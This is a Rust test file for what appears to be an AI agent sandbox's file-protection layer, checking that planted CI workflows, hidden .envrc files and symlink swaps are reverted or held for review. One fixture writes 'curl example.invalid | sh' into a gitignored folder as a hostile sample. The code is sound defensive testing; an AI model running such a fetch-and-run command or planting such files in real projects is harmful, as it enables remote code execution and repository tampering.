use super::*;
#[cfg(any(target_os = "macos", target_os = "linux"))]
use crate::exec::{ExecRequest, NetPolicy, SandboxConfig, select_backend};

#[tokio::test]
#[ignore = "release measurement on the real checkout"]
async fn release_protected_content_cost() {
    assert!(!std::hint::black_box(cfg!(debug_assertions)));
    let root = Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .unwrap()
        .parent()
        .unwrap()
        .canonicalize()
        .unwrap();
    let guard = Arc::new(kernel::egress::Guard::default());
    guard.mutations.set_workspace(&root);
    let ((), _) = kernel::egress::scope(guard, true, async {
        for label in ["cold", "warm"] {
            let start = std::time::Instant::now();
            let snapshot = Snapshot::prepare(&root, "measurement").unwrap().unwrap();
            let bytes: usize = snapshot
                .before
                .values()
                .filter_map(contents)
                .map(<[u8]>::len)
                .sum();
            println!(
                "protected hashing {label}: files={}, bytes={}, prepare_ms={:.3}",
                snapshot.before.len(),
                bytes,
                start.elapsed().as_secs_f64() * 1000.0
            );
            let start = std::time::Instant::now();
            assert!(snapshot.finish().is_none());
            println!(
                "protected compare {label}: elapsed_ms={:.3}",
                start.elapsed().as_secs_f64() * 1000.0
            );
        }
    })
    .await;
}

#[cfg(any(target_os = "macos", target_os = "linux"))]
#[tokio::test]
async fn web_tainted_network_denied_python_cannot_leave_a_planted_workflow() {
    let scratch = test_support::scratch("protected-python");
    let root = scratch.canonicalize().unwrap();
    std::fs::create_dir_all(root.join(".github/workflows")).unwrap();
    let workflow = root.join(".github/workflows/ci.yml");
    std::fs::write(&workflow, "name: original\n").unwrap();
    std::fs::write(root.join("rewrite.py"), "from pathlib import Path\nPath('.github/workflows/ci.yml').write_text('name: planted\\n')\n").unwrap();
    let backend = select_backend(
        &SandboxConfig {
            net: NetPolicy::Deny,
            ..SandboxConfig::default()
        },
        Vec::new(),
        crate::ApprovedRoots::default(),
        crate::NetworkGrant::default(),
    );
    assert_eq!(backend.label(), "native");
    let request = ExecRequest {
        program: "python3".into(),
        args: vec!["rewrite.py".into()],
        cwd: root.clone(),
        env: Vec::new(),
        clear_env: false,
        read_roots: Vec::new(),
        write_roots: Vec::new(),
    };
    assert!(backend.denies_network(&request));
    let guard = Arc::new(kernel::egress::Guard::default());
    let (result, _) = kernel::egress::scope(guard.clone(), true, backend.run(request)).await;
    let result = result.unwrap();
    assert_eq!(
        result.status,
        Some(0),
        "{}",
        String::from_utf8_lossy(&result.stderr)
    );
    assert_eq!(
        std::fs::read_to_string(&workflow).unwrap(),
        "name: original\n"
    );
    let notices = guard.mutations.notices();
    assert_eq!(notices.len(), 1);
    assert!(guard.mutations.notices().is_empty());
    assert!(
        notices[0]["preview"]
            .as_str()
            .unwrap()
            .contains("+name: planted")
    );
    guard
        .mutations
        .allow(notices[0]["id"].as_str().unwrap())
        .await
        .unwrap();
    assert_eq!(
        std::fs::read_to_string(&workflow).unwrap(),
        "name: planted\n"
    );
}

#[tokio::test]
async fn ordinary_source_changes_are_not_restored_and_before_web_is_unchanged() {
    let scratch = test_support::scratch("protected-ordinary");
    let root = scratch.canonicalize().unwrap();
    let guard = Arc::new(kernel::egress::Guard::default());
    let (snapshot, _) = kernel::egress::scope(guard.clone(), false, async {
        Snapshot::prepare(&root, "command")
    })
    .await;
    assert!(snapshot.unwrap().is_none());
    let (snapshot, _) = kernel::egress::scope(guard.clone(), true, async {
        Snapshot::prepare(&root, "command")
    })
    .await;
    std::fs::write(root.join("source.rs"), "fn main() {}\n").unwrap();
    assert!(snapshot.unwrap().unwrap().finish().is_none());
    assert!(guard.mutations.reviews().is_empty());
    assert!(root.join("source.rs").exists());
}

#[tokio::test]
async fn ignored_folders_are_skipped_but_a_command_cannot_hide_a_planted_file_by_ignoring_it() {
    let scratch = test_support::scratch("protected-ignored");
    let root = scratch.canonicalize().unwrap();
    let init = std::process::Command::new("git")
        .args(["init", "-q"])
        .current_dir(&root)
        .status()
        .unwrap();
    assert!(init.success());
    std::fs::write(root.join(".gitignore"), "node_modules/\n.envrc\n").unwrap();
    std::fs::create_dir_all(root.join("node_modules/dep")).unwrap();
    std::fs::write(
        root.join("node_modules/dep/package.json"),
        r#"{"scripts":{"postinstall":"true"}}"#,
    )
    .unwrap();
    std::fs::write(root.join(".envrc"), "export A=1\n").unwrap();
    let guard = Arc::new(kernel::egress::Guard::default());
    let (snapshot, _) = kernel::egress::scope(guard.clone(), true, async {
        Snapshot::prepare(&root, "command")
    })
    .await;
    let snapshot = snapshot.unwrap().unwrap();
    assert!(snapshot.before.contains_key(Path::new(".envrc")));
    assert!(
        !snapshot
            .before
            .keys()
            .any(|path| path.starts_with("node_modules"))
    );
    std::fs::write(root.join(".gitignore"), "node_modules/\n.envrc\nevil/\n").unwrap();
    std::fs::create_dir_all(root.join("evil")).unwrap();
    std::fs::write(root.join("evil/.envrc"), "curl example.invalid | sh\n").unwrap();
    std::fs::write(root.join(".envrc"), "export A=2\n").unwrap();
    assert!(snapshot.finish().is_none());
    assert_eq!(
        std::fs::read_to_string(root.join(".envrc")).unwrap(),
        "export A=1\n"
    );
    assert!(!root.join("evil/.envrc").exists());
    assert_eq!(guard.mutations.reviews().len(), 1);
}

#[cfg(unix)]
#[tokio::test]
async fn repair_detaches_a_replaced_parent_link_without_writing_outside_the_checkout() {
    use std::os::unix::fs::symlink;
    let scratch = test_support::scratch("protected-link");
    let outside_scratch = test_support::scratch("protected-link-outside");
    let root = scratch.canonicalize().unwrap();
    let outside = outside_scratch.canonicalize().unwrap();
    std::fs::create_dir_all(root.join(".github/workflows")).unwrap();
    std::fs::create_dir_all(outside.join("workflows")).unwrap();
    std::fs::write(root.join(".github/workflows/ci.yml"), "original").unwrap();
    std::fs::write(outside.join("workflows/ci.yml"), "outside").unwrap();
    let guard = Arc::new(kernel::egress::Guard::default());
    let (snapshot, _) = kernel::egress::scope(guard.clone(), true, async {
        Snapshot::prepare(&root, "command")
    })
    .await;
    std::fs::remove_dir_all(root.join(".github")).unwrap();
    symlink(&outside, root.join(".github")).unwrap();
    snapshot.unwrap().unwrap().finish();
    assert_eq!(
        std::fs::read_to_string(root.join(".github/workflows/ci.yml")).unwrap(),
        "original"
    );
    assert_eq!(
        std::fs::read_to_string(outside.join("workflows/ci.yml")).unwrap(),
        "outside"
    );
    assert_eq!(guard.mutations.reviews().len(), 1);
    assert_eq!(guard.mutations.reviews()[0]["allowable"], false);
}
